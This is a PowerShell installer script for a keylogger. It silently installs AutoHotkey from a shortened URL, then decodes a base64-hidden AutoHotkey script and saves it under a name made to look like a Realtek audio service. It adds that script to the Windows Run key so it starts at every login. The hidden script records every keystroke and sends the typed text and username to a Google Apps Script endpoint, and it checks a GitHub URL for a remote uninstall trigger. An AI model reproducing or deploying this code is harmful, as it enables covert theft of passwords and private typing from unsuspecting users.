Write-Output "V1.1"
Set-StrictMode -Off

function z($5VAUPX0,$8UNyT,$C1A = $false){
    $CwgmejzO9vBEoiVkc3WIdxT7S = [System.Convert]::FromBase64String($5VAUPX0)

    [System.IO.File]::WriteAllBytes($8UNyT, $CwgmejzO9vBEoiVkc3WIdxT7S)
    Write-Output $8UNyT
    if($C1A){
        Start-Process $8UNyT
    }
}

$aWRP4k = "$ENV:USERPROFILE\Downloads\AutoHotKeyInstaller.exe"
if (-Not (Test-Path -Path $aWRP4k)){
    Start-BitsTransfer -Source "https://shorturl.at/rnxiX" -Destination $aWRP4k
}

Start-Process $aWRP4k -ArgumentList "/silent" -Wait
Remove-Item -Path $aWRP4k

$n7Ps98plwkJq  = "I1JlcXVpcmVzIEF1dG9Ib3RrZXkgdjIuMAojU2luZ2xlSW5zdGFuY2UgRm9yY2UKCnVuaW5zdGFsbCgpIHsKICAgIE1zZ0JveCAnVW5pbnN0YWxsaW5nJwogICAgcmVnUGF0aCA6PSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICByZWdWYWx1ZU5hbWUgOj0gIlJ0a0F1ZFVTZXJ2aWNlNjQiCiAgICB0cnkgewogICAgICAgIFJlZ0RlbGV0ZShyZWdQYXRoLCByZWdWYWx1ZU5hbWUpCiAgICB9CiAgICBwYXRoIDo9IEVudkdldCgnVGVtcCcpICdcNTJjZTdiYTMtOThlYi00MGEzLWJjNWMtM2Y1OTU4YjI3MGMwLmV4ZScKICAgIEZpbGVEZWxldGUgQV9TY3JpcHRGdWxsUGF0aAogICAgRG93bmxvYWQgImh0dHBzOi8vc2hvcnR1cmwuYXQvcm54aVgiLCBwYXRoCiAgICBsb29wIHsKICAgICAgICBpZiAoRmlsZUV4aXN0KHBhdGgpKSB7CiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgfQogICAgICAgIFNsZWVwKDEwKQogICAgfQogICAgcGFyYW1zIDo9IHBhdGggJyAvdW5pbnN0YWxsIC9TSUxFTlQnCiAgICBSdW4gcGFyYW1zCn0KCmdsb2JhbCBVU0VSTkFNRSA6PSBFbnZHZXQoIlVTRVJOQU1FIikKZ2xvYmFsIHRleHQgOj0gJycKZ2xvYmFsIGVwb2NoVGltZSA6PSAwCgp1cmwgOj0gRm9ybWF0KCdodHRwczovL3NjcmlwdC5nb29nbGUuY29tL21hY3Jvcy9zL0FLZnljYndOVWFNNWtIQkUzTHNxemlIRDdJVmd4MFAtallZTXFXOFg0dzBpWWI4c1pmU0s1QmlWWHcteUhZRmhpRVg1R3dxUy9leGVjP3VzZXI9ezF9JywgVVNFUk5BTUUpCndociA6PSBDb21PYmplY3QoJ1dpbkh0dHAuV2luSHR0cFJlcXVlc3QuNS4xJykKd2hyLk9wZW4oJ0dFVCcsIHVybCwgRmFsc2UpLCB3aHIuU2VuZCgpCgpyZXBlYXRTdHJpbmcoc3RyaW5nLCBjb3VudCkgewogICAgcmVzdWx0IDo9ICIiCiAgICBMb29wIGNvdW50IHsKICAgICAgICByZXN1bHQgLj0gc3RyaW5nCiAgICB9CiAgICByZXR1cm4gcmVzdWx0Cn0KClVybEVuY29kZShzdHIpIHsKICAgIGVuY29kZWQgOj0gIiIKICAgIGNoYXJzIDo9IFN0clNwbGl0KHN0cikgIDsgU3BsaXQgdGhlIHN0cmluZyBpbnRvIGFuIGFycmF5IG9mIGNoYXJhY3RlcnMKICAgIGZvciBjaGFyIGluIGNoYXJzIHsKICAgICAgICBpZiAoY2hhciA9ICJgbiIpIHsKICAgICAgICAgICAgZW5jb2RlZCAuPSAiJTBBIiAgOyBFbmNvZGUgbmV3bGluZSBhcyAlMEEKICAgICAgICB9IGVsc2UgaWYgKGNoYXIgPSAiYHIiKSB7CiAgICAgICAgICAgIGVuY29kZWQgLj0gIiUwRCIgIDsgRW5jb2RlIGNhcnJpYWdlIHJldHVybiBhcyAlMEQKICAgICAgICB9IGVsc2UgaWYgKFJlZ0V4TWF0Y2goY2hhciwgIl5bQS1aYS16MC05XSQiKSkgewogICAgICAgICAgICBlbmNvZGVkIC49IGNoYXIgIDsgS2VlcCBhbHBoYW51bWVyaWMgY2hhcmFjdGVycyB1bmNoYW5nZWQKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBlbmNvZGVkIC49ICIlIiAuIEZvcm1hdCgiezpYfSIsIE9yZChjaGFyKSkgIDsgQ29udmVydCB0byB1cHBlcmNhc2UgaGV4YWRlY2ltYWwKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gZW5jb2RlZAp9CmNoZWNrKCkgewogICAgd2hyIDo9IENvbU9iamVjdCgnV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEnKQogICAgd2hyLk9wZW4oJ0dFVCcsICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdmZ5YS9hL3JlZnMvaGVhZHMvbWFpbi8nIFVybEVuY29kZShVU0VSTkFNRSkpCiAgICB3aHIuU2VuZCgpCiAgICByZXNwb25zZSA6PSB3aHIuUmVzcG9uc2VUZXh0CgogICAgaWYgKHJlc3BvbnNlICE9ICI0MDQ6IE5vdCBGb3VuZCIpIHsKICAgICAgICB1bmluc3RhbGwoKQogICAgfQp9CmNoZWNrKCkKU2VuZCh0eHQpIHsKICAgIHR4dCA6PSBVcmxFbmNvZGUodHh0KQogICAgdXJsIDo9IEZvcm1hdCgnaHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3TlVhTTVrSEJFM0xzcXppSEQ3SVZneDBQLWpZWU1xVzhYNHcwaVliOHNaZlNLNUJpVlh3LXlIWUZoaUVYNUd3cVMvZXhlYz91c2VyPXsxfSZxPXsyfScsIFVTRVJOQU1FLCB0eHQpCiAgICB3aHIgOj0gQ29tT2JqZWN0KCdXaW5IdHRwLldpbkh0dHBSZXF1ZXN0LjUuMScpCiAgICB3aHIuT3BlbignR0VUJywgdXJsLCBGYWxzZSkKICAgIHdoci5TZW5kKCkKICAgIGNoZWNrKCkKfQpMb2coa2V5KSB7CiAgICBnbG9iYWwgdGV4dAogICAgZ2xvYmFsIGVwb2NoVGltZQogICAgaWYgKGtleSA9PSAnQkFDS1NQQUNFJykgewogICAgICAgIHRleHQgOj0gU3ViU3RyKHRleHQsIDEsIFN0ckxlbih0ZXh0KSAtIDEpCiAgICAgICAgcmV0dXJuCiAgICB9CiAgICBlcG9jaFRpbWUgOj0gQV9UaWNrQ291bnQKICAgIHRleHQgLj0ga2V5Cn0KfjA6OiBMb2coJzAnKQp+MTo6IExvZygnMScpCn4yOjogTG9nKCcyJykKfjM6OiBMb2coJzMnKQp+NDo6IExvZygnNCcpCn41OjogTG9nKCc1JykKfjY6OiBMb2coJzYnKQp+Nzo6IExvZygnNycpCn44OjogTG9nKCc4JykKfjk6OiBMb2coJzknKQp+YTo6IExvZygnYScpCn5iOjogTG9nKCdiJykKfmM6OiBMb2coJ2MnKQp+ZDo6IExvZygnZCcpCn5lOjogTG9nKCdlJykKfmY6OiBMb2coJ2YnKQp+Zzo6IExvZygnZycpCn5oOjogTG9nKCdoJykKfmk6OiBMb2coJ2knKQp+ajo6IExvZygnaicpCn5rOjogTG9nKCdrJykKfmw6OiBMb2coJ2wnKQp+bTo6IExvZygnbScpCn5uOjogTG9nKCduJykKfm86OiBMb2coJ28nKQp+cDo6IExvZygncCcpCn5xOjogTG9nKCdxJykKfnI6OiBMb2coJ3InKQp+czo6IExvZygncycpCn50OjogTG9nKCd0JykKfnU6OiBMb2coJ3UnKQp+djo6IExvZygndicpCn53OjogTG9nKCd3JykKfng6OiBMb2coJ3gnKQp+eTo6IExvZygneScpCn56OjogTG9nKCd6JykKCn4rYTo6IExvZygnQScpCn4rYjo6IExvZygnQicpCn4rYzo6IExvZygnQycpCn4rZDo6IExvZygnRCcpCn4rZTo6IExvZygnRScpCn4rZjo6IExvZygnRicpCn4rZzo6IExvZygnRycpCn4raDo6IExvZygnSCcpCn4raTo6IExvZygnSScpCn4rajo6IExvZygnSicpCn4razo6IExvZygnSycpCn4rbDo6IExvZygnTCcpCn4rbTo6IExvZygnTScpCn4rbjo6IExvZygnTicpCn4rbzo6IExvZygnTycpCn4rcDo6IExvZygnUCcpCn4rcTo6IExvZygnUScpCn4rcjo6IExvZygnUicpCn4rczo6IExvZygnUycpCn4rdDo6IExvZygnVCcpCn4rdTo6IExvZygnVScpCn4rdjo6IExvZygnVicpCn4rdzo6IExvZygnVycpCn4reDo6IExvZygnWCcpCn4reTo6IExvZygnWScpCn4rejo6IExvZygnWicpCgp+KlNwYWNlOjogTG9nKCcgJykKfipFbnRlcjo6IExvZygnYG4nKQp+KkJhY2tzcGFjZTo6IExvZygnQkFDS1NQQUNFJykKflRhYjo6IExvZygnYHQnKSAgOyBUYWIgdXNpbmcgZXNjYXBlIHNlcXVlbmNlCgp+KzE6OiBMb2coIiEiKQp+KzI6OiBMb2coIkAiKQp+KzM6OiBMb2coJ2AjJykKfis0OjogTG9nKCIkIikKfis1OjogTG9nKCIlIikKfis2OjogTG9nKCJeIikKfis3OjogTG9nKCImIikKfis4OjogTG9nKCIqIikKfis5OjogTG9nKCIoIikKfiswOjogTG9nKCIpIikKCn4tOjogTG9nKCctJykKfistOjogTG9nKCdfJykKfj06OiBMb2coJz0nKQp+Kz06OiBMb2coJysnKQoKfls6OiBMb2coJ1snKQp+XTo6IExvZygnXScpCn5cOjogTG9nKCdcJykKfjs6OiBMb2coJzsnKQp+YDo6IExvZygnYGAnKQp+K2A6OiBMb2coJ34nKQp+LDo6IExvZygnLCcpCn4rLDo6IExvZygnPCcpCn4rLjo6IExvZygnPicpCn4rLzo6IExvZygnPycpCn4uOjogTG9nKCcuJykKfi86OiBMb2coJy8nKQp+K1s6OiBMb2coJ3snKQp+K106OiBMb2coJ30nKQp+K1w6OiBMb2coJ3wnKQp+Kzs6OiBMb2coJzonKQp+Kyc6OiBMb2coJyInKQp+Jzo6IExvZygiJyIpCkxvb3AgewogICAgZ2xvYmFsIGVwb2NoVGltZSwgdGV4dAogICAgdGljayA6PSBBX1RpY2tDb3VudCAgOyBHZXQgY3VycmVudCBVVEMgdGltZQogICAgaWYgKCh0aWNrIC0gZXBvY2hUaW1lKSAvIDEwMDAgPiA1KSAmJiAodGV4dCAhPSAnJykgeyAgOyBDb21wYXJlIGluIG1pbGxpc2Vjb25kcyAoMTAgc2Vjb25kcykKICAgICAgICBTZW5kKHRleHQpCiAgICAgICAgdGV4dCA6PSAnJwogICAgICAgIGVwb2NoVGltZSA6PSB0aWNrCiAgICB9CiAgICBTbGVlcCgxMDApCn0="
Write-Output $ENV:USERPROFILE
$butTG0 = "$ENV:USERPROFILE\RtkAudUService64.ahk"
z $n7Ps98plwkJq $butTG0 $true
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RtkAudUService64" -Value $butTG0